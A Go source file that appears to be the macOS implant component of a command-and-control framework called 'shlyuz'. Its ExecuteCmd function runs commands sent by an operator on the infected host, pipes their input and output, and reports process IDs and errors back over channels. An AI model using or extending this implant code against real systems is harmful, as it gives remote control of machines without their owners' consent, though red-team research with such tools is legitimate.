//go:build darwin,implant && (!lp || !teamserver) // Darwin build tag

package fireinteract

import (
	"io"
	"log"
	"os/exec"
	"shlyuz/pkg/component"
	"strings"
)

// ExecuteCmd sets up an interactive session with a command on Darwin.
// It uses standard OS pipes for stdin, stdout, and stderr, managed by os/exec.
// Input is read from inPipe, output (stdout & stderr merged) is written to outPipeWriter.
func ExecuteCmd(cmdDetails component.Command, execChannels *component.ComponentExecutionChannel, inPipe io.Reader, outPipeWriter io.Writer) error {
	log.Printf("CmdID %s (Darwin): Setting up interactive command: %s", cmdDetails.Id, cmdDetails.Args)

	var command *exec.Cmd
	if cmdDetails.Type == "Shell" {
		cmdSlice := strings.Split(cmdDetails.Args, " ")
		command = exec.Command(cmdSlice[0], cmdSlice[1:]...)
		log.Printf("CmdID %s (Darwin): Executing split shell command: %s, Args: %v", cmdDetails.Id, cmdSlice[0], cmdSlice[1:])
	} else {
		command = exec.Command(cmdDetails.Args)
		log.Printf("CmdID %s (Darwin): Executing direct command: %s", cmdDetails.Id, cmdDetails.Args)
	}


	if inPipe != nil {
		command.Stdin = inPipe
		log.Printf("CmdID %s (Darwin): Stdin connected.", cmdDetails.Id)
	} else {
		log.Printf("CmdID %s (Darwin): No inPipe provided for stdin.", cmdDetails.Id)
	}

	if outPipeWriter != nil {
		command.Stdout = outPipeWriter
		command.Stderr = outPipeWriter // Merge stdout and stderr
		log.Printf("CmdID %s (Darwin): Stdout/Stderr connected.", cmdDetails.Id)
	} else {
		log.Printf("CmdID %s (Darwin): No outPipeWriter provided for stdout/stderr.", cmdDetails.Id)
	}

	if err := command.Start(); err != nil {
		errMsg := "Error starting interactive command"
		// Log the original cmdDetails.Args for clarity, as 'command' might be just the first part.
		log.Printf("CmdID %s (Darwin): %s '%s': %v", cmdDetails.Id, errMsg, cmdDetails.Args, err)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Darwin): StdErr channel full.", cmdDetails.Id)
			}
		}
		return err
	}

	log.Printf("CmdID %s (Darwin): Interactive command started successfully (PID: %d). Args: %s", cmdDetails.Id, command.Process.Pid, cmdDetails.Args)

	if execChannels != nil && execChannels.Pid != nil {
		select {
		case execChannels.Pid <- command.Process.Pid:
		default: log.Printf("CmdID %s (Darwin): Pid channel full, dropping PID.", cmdDetails.Id)
		}
	}

	go func() {
		waitErr := command.Wait()
		if waitErr != nil {
			log.Printf("CmdID %s (Darwin): Interactive command finished with error: %v. Args: %s", cmdDetails.Id, waitErr, cmdDetails.Args)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- waitErr.Error(): // Send the direct error from Wait()
				default: log.Printf("CmdID %s (Darwin): StdErr channel full, dropping command wait error.", cmdDetails.Id)
				}
			}
		} else {
			log.Printf("CmdID %s (Darwin): Interactive command finished successfully. Args: %s", cmdDetails.Id, cmdDetails.Args)
		}

		if outPipeWriter != nil {
			if closer, ok := outPipeWriter.(io.Closer); ok {
				log.Printf("CmdID %s (Darwin): Closing outPipeWriter for interactive session.", cmdDetails.Id)
				if errClose := closer.Close(); errClose != nil {
					log.Printf("CmdID %s (Darwin): Error closing outPipeWriter: %v", cmdDetails.Id, errClose)
					// Optionally send this to execChannels.StdErr if needed
				}
			}
		}
	}()

	return nil 
}
